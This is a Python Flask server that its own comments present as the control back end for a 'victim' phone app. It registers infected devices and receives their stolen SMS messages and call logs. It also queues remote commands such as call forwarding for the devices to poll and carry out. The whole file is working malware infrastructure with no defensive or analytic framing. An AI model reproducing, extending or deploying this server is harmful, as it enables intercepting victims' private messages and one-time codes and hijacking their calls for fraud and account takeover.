from flask import Flask, request, jsonify
from flask_cors import CORS
import json

app = Flask(__name__)
CORS(app)

# ==========================================
# DATA STORE
# ==========================================
devices = {}        # device_id -> device info
sms_store = {}      # device_id -> list of sms
call_store = {}     # device_id -> list of calls
command_queue = {}  # device_id -> {"command": "CALL_FWD", "data": "number"}

# ==========================================
# 1. REGISTER API
# ==========================================
@app.route('/api/register', methods=['POST'])
def register():
    data = request.get_json()
    device_id = data.get('device_id')
    if not device_id:
        return jsonify({"error": "No device_id"}), 400
    
    devices[device_id] = data
    sms_store[device_id] = []
    call_store[device_id] = []
    
    print(f"[+] Device Registered: {device_id}")
    return jsonify({"status": "success", "device_id": device_id}), 200

# ==========================================
# 2. SMS RECEIVE API
# ==========================================
@app.route('/api/sms', methods=['POST'])
def receive_sms():
    data = request.get_json()
    device_id = data.get('device_id')
    
    if device_id and device_id in sms_store:
        sms_store[device_id].append(data)
        print(f"[+] SMS from {device_id}: {data.get('body')}")
        return jsonify({"status": "received"}), 200
    
    return jsonify({"error": "Device not found"}), 404

# ==========================================
# 3. CALL RECEIVE API
# ==========================================
@app.route('/api/call', methods=['POST'])
def receive_call():
    data = request.get_json()
    device_id = data.get('device_id')
    
    if device_id and device_id in call_store:
        call_store[device_id].append(data)
        print(f"[+] Call from {device_id}: {data.get('type')}")
        return jsonify({"status": "received"}), 200
    
    return jsonify({"error": "Device not found"}), 404

# ==========================================
# 4. DEVICES LIST API (Dashboard)
# ==========================================
@app.route('/api/devices', methods=['GET'])
def get_devices():
    device_list = []
    for device_id, info in devices.items():
        device_list.append({
            "id": device_id,
            "device_name": info.get("device_name", "Unknown"),
            "phone": info.get("phone", ""),
            "status": info.get("status", "Online"),
            "name": info.get("name", "")
        })
    return jsonify({"devices": device_list}), 200

# ==========================================
# 5. SET COMMAND API (Dashboard se command set karega)
# ==========================================
@app.route('/api/set_command', methods=['POST'])
def set_command():
    data = request.get_json()
    device_id = data.get('device_id')
    command = data.get('command')
    command_data = data.get('data')
    
    if not device_id or not command:
        return jsonify({"error": "device_id and command required"}), 400
    
    # Command store karo
    command_queue[device_id] = {
        "command": command,
        "data": command_data
    }
    print(f"[+] Command set for {device_id}: {command} -> {command_data}")
    return jsonify({"status": "command set"}), 200

# ==========================================
# 6. COMMAND FETCH API (Victim app ise poll karegi)
# ==========================================
@app.route('/api/commands/<device_id>', methods=['GET'])
def get_commands(device_id):
    # Check if command exists for this device
    if device_id in command_queue:
        cmd = command_queue[device_id]
        # Command dekar queue se hata do (taaki baar baar execute na ho)
        del command_queue[device_id]
        return jsonify({
            "command": cmd["command"],
            "data": cmd["data"]
        }), 200
    else:
        return jsonify({
            "command": "",
            "data": ""
        }), 200

# ==========================================
# 7. RUN SERVER
# ==========================================
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
